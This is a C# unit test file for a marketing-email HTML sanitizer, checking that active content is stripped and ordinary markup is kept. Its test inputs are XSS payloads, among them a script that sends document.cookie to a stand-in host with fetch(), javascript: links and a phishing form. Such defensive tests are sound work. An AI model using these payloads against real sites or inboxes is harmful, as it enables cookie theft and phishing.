using DeChimex.Shared.Constants;
using FluentAssertions;
using Xunit;

namespace DeChimex.UnitTests.Shared;

/// <summary>
/// Tests for the marketing HTML sanitizer. Broadcast content is composed by
/// privileged admins, but it is still user input that ends up in customer
/// inboxes - the sanitizer must strip active content (script, frames, inline
/// handlers, dangerous URL schemes) while leaving normal marketing markup
/// (headings, images, links, inline styles) untouched.
/// </summary>
public class MarketingHtmlSanitizerTests
{
    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void Sanitize_BlankInput_ReturnsEmpty(string? input)
    {
        MarketingHtmlSanitizer.Sanitize(input!).Should().Be(string.Empty);
    }

    [Fact]
    public void Sanitize_RemovesScriptBlocksIncludingContent()
    {
        var html = "<h1>Hi</h1><script>alert('x')</script><p>Bye</p>";
        var result = MarketingHtmlSanitizer.Sanitize(html);
        result.Should().NotContainAny("script", "alert");
        result.Should().Contain("<h1>Hi</h1>").And.Contain("<p>Bye</p>");
    }

    [Theory]
    [InlineData("<iframe src=\"https://evil.example\"></iframe>")]
    [InlineData("<object data=\"https://evil.example/x.swf\"></object>")]
    [InlineData("<embed src=\"https://evil.example/x.swf\">")]
    [InlineData("<form action=\"https://evil.example/phish\"><input name=\"pw\"></form>")]
    [InlineData("<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">")]
    [InlineData("<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">")]
    [InlineData("<base href=\"https://evil.example/\">")]
    public void Sanitize_RemovesActiveAndExternalResourceTags(string tag)
    {
        var result = MarketingHtmlSanitizer.Sanitize($"<p>ok</p>{tag}<p>ok2</p>");
        result.Should().NotContainAny("iframe", "object", "embed", "<form", "<input", "<link", "meta", "<base");
        result.Should().Contain("<p>ok</p>").And.Contain("<p>ok2</p>");
    }

    [Theory]
    [InlineData("<div onclick=\"steal()\">x</div>", "onclick")]
    [InlineData("<body onload='steal()'>x</body>", "onload")]
    [InlineData("<img src=x onerror=steal()>", "onerror")]
    public void Sanitize_RemovesInlineEventHandlers(string html, string handler)
    {
        var result = MarketingHtmlSanitizer.Sanitize(html);
        result.Should().NotContain(handler);
        result.Should().NotContain("steal");
    }

    [Theory]
    [InlineData("<a href=\"javascript:steal()\">click</a>")]
    [InlineData("<a href='javascript:steal()'>click</a>")]
    [InlineData("<a href=javascript:steal()>click</a>")]
    [InlineData("<a href=\"vbscript:msgbox(1)\">click</a>")]
    [InlineData("<a href=\"data:text/html;base64,PHNjcmlwdD4=\">click</a>")]
    [InlineData("<img src=\"javascript:steal()\">")]
    public void Sanitize_NeutralizesDangerousUrlSchemes(string html)
    {
        var result = MarketingHtmlSanitizer.Sanitize(html);
        result.Should().NotContainAny("javascript:", "vbscript:", "data:text/html", "steal");
        result.Should().ContainAny("href=\"#\"", "src=\"#\"");
    }

    [Fact]
    public void Sanitize_PreservesLegitimateMarketingMarkup()
    {
        var html = """
            <h1 style="color:#1a1a1a;">Spring sale!</h1>
            <p>Hello <strong>there</strong>, we have <em>news</em>.</p>
            <a href="https://dechimexprints.com/shop">Shop now</a>
            <a href="mailto:hello@dechimexprints.com">Email us</a>
            <img src="https://cdn.dechimexprints.com/banner.png" alt="Banner" width="600">
            <table><tr><td bgcolor="#f4f4f4">Card content</td></tr></table>
            """;
        var result = MarketingHtmlSanitizer.Sanitize(html);
        result.Should().Be(html); // nothing legitimate should be touched
    }

    [Fact]
    public void Sanitize_HandlesMixedAttackInOneDocument()
    {
        var html = """
            <h1>Deal</h1>
            <script>fetch('https://evil.example?c='+document.cookie)</script>
            <p onclick="steal()" style="margin:0">Text</p>
            <a href="javascript:steal()">Bad link</a>
            <iframe src="https://evil.example"></iframe>
            <p>Legit paragraph.</p>
            """;
        var result = MarketingHtmlSanitizer.Sanitize(html);
        result.Should().NotContainAny("script", "onclick", "javascript:", "iframe", "evil.example", "steal");
        result.Should().Contain("<h1>Deal</h1>")
              .And.Contain("<p style=\"margin:0\">Text</p>")
              .And.Contain("<p>Legit paragraph.</p>");
    }
}
